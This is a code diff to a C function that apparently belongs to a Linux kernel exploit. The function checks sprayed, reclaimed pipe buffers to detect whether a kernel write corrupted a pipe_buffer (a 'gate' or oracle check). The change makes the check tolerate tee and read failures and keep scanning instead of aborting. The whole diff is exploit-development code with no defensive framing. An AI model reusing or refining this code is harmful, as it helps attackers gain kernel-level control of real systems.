@@ -976,18 +976,24 @@ int verify_p0_pipe_oracle_gate(void) {
   int gate_hits = 0;
   int gate_pipe_index = -1;
   int changed_pages = 0;
+  int tee_failures = 0;
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
                               p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
+      /* A tee EFAULT on a freshly filled pipe is itself a signal (the
+       * kernel write may have touched this pipe_buffer).  Keep scanning
+       * the remaining pipes instead of aborting the whole gate check. */
       pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                  pipe_index, errno);
-      spawn_p0_ref_keeper(-1);
-      return 0;
+      tee_failures++;
+      continue;
     }
     if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                         sizeof(page))) {
-      spawn_p0_ref_keeper(-1);
-      return 0;
+      pr_warning("p0 gate read failed pipe=%zu errno=%d\n",
+                 pipe_index, errno);
+      tee_failures++;
+      continue;
     }
     size_t gate_offset = PAGE_SIZE;
     for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
@@ -1030,16 +1036,18 @@ int verify_p0_pipe_oracle_gate(void) {
       return 0;
     }
   }
-  pr_info("p0 pipe gate hits=%d changed=%d\n",
-          gate_hits, changed_pages);
-  if (gate_hits != 0 || changed_pages != 0) {
+  pr_info("p0 pipe gate hits=%d changed=%d tee_failures=%d\n",
+          gate_hits, changed_pages, tee_failures);
+  if (gate_hits != 0 || changed_pages != 0 || tee_failures != 0) {
     spawn_p0_ref_keeper(
-        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
+        gate_hits == 1 && changed_pages == 0 && tee_failures == 0
+            ? gate_pipe_index
+            : -1);
   }
-  if (gate_hits == 1 && changed_pages == 0) {
+  if (gate_hits == 1 && changed_pages == 0 && tee_failures == 0) {
     return 1;
   }
-  if (gate_hits == 0 && changed_pages == 0) {
+  if (gate_hits == 0 && changed_pages == 0 && tee_failures == 0) {
     return 0;
   }
   return -1;
